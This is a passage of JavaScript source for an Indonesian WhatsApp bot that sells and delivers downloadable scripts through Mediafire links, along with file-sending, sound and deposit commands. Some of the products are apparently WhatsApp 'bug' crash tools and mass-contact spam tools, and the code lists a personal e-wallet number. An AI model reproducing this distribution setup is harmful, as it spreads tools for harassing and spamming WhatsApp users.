kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc11': {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/lv7zxaijoonpexd/Sc+Hw21_No+Enc.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscbugv1': {
 if (cekSaldo(sender,db_saldo) < 15000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/xfw5xe4mprrlrq9/Sc_Bug_V1.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscbugv2': {
if (cekSaldo(sender,db_saldo) < 25000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xuzamc8oayprn4k/Sc_Bug_V2.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscbugv3': {
if (cekSaldo(sender,db_saldo) < 35000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/l76f8btgfpqln9z/Sc_Bug_V3.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscjagagrupv2': {
if (cekSaldo(sender,db_saldo) < 15000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)    
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/fnbxdwor0ldky84/JagaGrup+V2.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscpushkontak': {
if (cekSaldo(sender,db_saldo) < 10000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xdh4ocswkkt7tt2/BotSaveContact.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscpushautosave': {
if (cekSaldo(sender,db_saldo) < 15000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/yousxcwwv5cjj0p/SC+PUSH+SIMPLE+BY+RAFATHAR+OFFCIAL.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscjpmv1': {
if (cekSaldo(sender,db_saldo) < 15000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/bdtbszlg69old31/Jpm+X+PushKntk+V1.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscjpmv2': {
if (cekSaldo(sender,db_saldo) < 20000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 20000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/ilam1m6wsgxqh6b/Jpm+X+PushKntk+V2.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscjpmv3': {
if (cekSaldo(sender,db_saldo) < 25000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 25000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/o1sj4k0aeb2frm0/Jpm+X+PushKntk+V3.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buymodule': {
if (cekSaldo(sender,db_saldo) < 15000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`)
const baby2 = await mediafireDl('-')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
case 'apksearch': {
if (!text) return reply(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
await kyy.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    kyy.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break
   case 'setbiobot':{
if (!isCreator) return reply(`Khusus Kyy`)
if (!text) return reply(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await kyu.updateProfileStatus(text)
    reply(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(`Khusus Group`)
if (!isAdmins) return reply(`Khusus admin`)
if (!isBotAdmins) return reply(`Jadikan Hanako Admin Dulu`)
    await kyy.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!isCreator) return reply(`Khusus Kyy`)
    await kyy.removeProfilePicture(kyy.user.id)
    reply(`Success in deleting bot's profile picture`)
    }
    break
    case 'setcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let teks = `list cmd`
kyy.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'addpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await kyy.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break
//=================================================//
case 'delpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
//=================================================//
case 'listpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf ${botname} + sbuy reply pesan target* \n\n Contoh 2 : yopdf ${botname}`
m.reply(teksoooo)
}
break
//=================================================//
case 'yopdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
let teks = `${text}`
{
kyy.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
kyy.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await kyy.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
//=================================================//
case 'delzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
//=================================================//
case 'listzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip ${botname} + sambil reply pesan target* \n\n Contoh 2 : yozip ${botname}`
m.reply(teksooooo)
}
break
//=================================================//
case 'yozip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
kyy.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
kyy.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await kyy.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
//=================================================//
case 'delapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
//=================================================//
case 'listapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk ${botname} + sambil reply pesan target* \n\n Contoh 2 : yoapk ${botname}`
m.reply(teksoooooo)
}
break
//=================================================//
case 'yoapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
kyy.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
kyy.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await kyy.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
//=================================================//
case 'delvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break
//=================================================//
case 'listvn':{
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}
break
//=================================================//
case 'addmsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) throw `Example : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'sendlist': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 kyy.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break
//=================================================//
case 'listmsg': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
m.reply(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//
case 'getmsg': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 kyy.copyNForward(from, msgs[text.toLowerCase()], true)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await kyy.sendMessage(from, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6283890755137',
title: `KyyXD`,
sourceUrl: `https://wa.me/+628877319724`, 
thumbnail: thumb
}
}})
break
case 'minsaldo':
if (!isCreator) m.reply(mess.OnlyOwner)
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
case 'addsaldo':{
if (!isCreator) return m.reply('F')
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
}
break   
case 'dana': {
reply(`Dana : 088286326619 Bukti? ketik .bukti dana 1000`)
}
break
case 'saldo':{
m.reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo hanya bisa untuk buysrv_
_Tidak bisa ditarik atau transfer_!`)
}
        break
case 'deposit': case 'depo':{
reply(`Hai *@${sender.split('@')[0]}*\nIngin melakukan deposit saldo? Silahkan pilih payment yang tersedia dibawah!
- ${prefix}dana
- ${prefix}qris

ITU ADALAH E-WALET YANG DI GUNAKAN KAK KYY`)
}
break   
case 'bukti':{
m.reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT ADA KENDALA/DEPOSIT BELOM DI KONFIRMASI BISA CHAT OWNER DI BAWAH.')
kyy.sendMessage('6288286326619@s.whatsapp.net', { text: `*ADA YANG DEPOSIT NIH*\n\n*@${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
        }
        break
        case 'dana': {
        reply(`Dana : 088286326619 Ss Bukti Dengan Cara .bukti Dana 1000`)
        }
        break
        case 'qris': {
await loading()
const hy = createSerial(20)
teks28 = `「 ᴘᴇᴍʙᴀʏᴀʀᴀɴ 」
ꜱᴛᴀᴛᴜꜱ : _ᴘᴇɴᴅɪɴɢ_
ɪᴅ ᴜꜱᴇʀ : _@${m?.sender.split('@')[0]}_
ɪᴅ ᴘᴇᴍʙᴀʏᴀʀᴀɴ : _${hy}_
Qʀɪꜱ ᴇxᴘɪʀᴇᴅ : _10ᴍᴜɴɪᴛᴇꜱ_
ᴛʀx ᴅɪ ʟᴀᴋᴜᴋᴀɴ ᴘᴀᴅᴀ : _${salam}_

*ɴᴏᴛᴇ* : _ᴊɪᴋᴀ ꜱᴜᴅᴀʜ ᴛʀᴀɴꜱꜰᴇʀ ꜱɪʟᴀʜᴋᴀɴ ᴋᴇᴛɪᴋ ᴄᴏɴᴛᴏʜ : .ʙᴜᴋᴛɪ Qʀɪꜱ5ᴋ ,, ᴅᴀɴ ꜱᴇʀᴛᴀᴋᴀɴ ɴᴀᴍᴀ ᴘᴇɴɢɪʀɪᴍ ᴇ-ᴡᴀʟᴇᴛ ᴄᴏɴᴛᴏʜ : ᴀᴛᴀꜱ ɴᴀᴍᴀ ᴅᴀɴᴀ : ᴋʏʏxᴅ ʜᴀɴʏᴀ ᴄᴏɴᴛᴏʜ ,, ᴊɪᴋᴀ ᴛɪᴅᴀᴋ ᴍᴇɴɢɪᴋᴜᴛɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪ ᴘʀᴏꜱᴇꜱ_

「 ᴄᴀʀᴀ ʙᴀʏᴀʀ 」
- ᴍᴀꜱᴜᴋ ᴋᴇ ᴀᴘᴋ ᴇ-ᴡᴀʟᴇᴛ ʏᴀɴɢ ᴋᴀʟɪᴀɴ ɢᴜɴᴀᴋᴀɴ
- ꜱᴄᴀɴ Qʀɪꜱ ʏᴀɴɢ ᴛᴇʟᴀʜ ᴅɪ ᴋɪʀɪᴍ
- ᴍᴀꜱᴜᴋᴀɴ ɴᴏᴍɪɴᴀʟ ʏᴀɴɢ ᴀɴᴅᴀ ɪɴɢɪɴᴋᴀɴ
- ᴛʀᴀɴꜰᴇʀ
- ᴋɪʀɪᴍ ʙᴜᴋᴛɪ ꜱᴇʀᴛᴀᴋᴀɴ ɴᴀᴍᴀ ᴅᴀʀɪ ᴇ-ᴡᴀʟᴇᴛ ʏᴀɴɢ ᴋᴀʟɪᴀɴ ɢᴜɴᴀᴋᴀɴ
- ᴘʀᴏꜱᴇs
- ᴅᴏɴᴇ

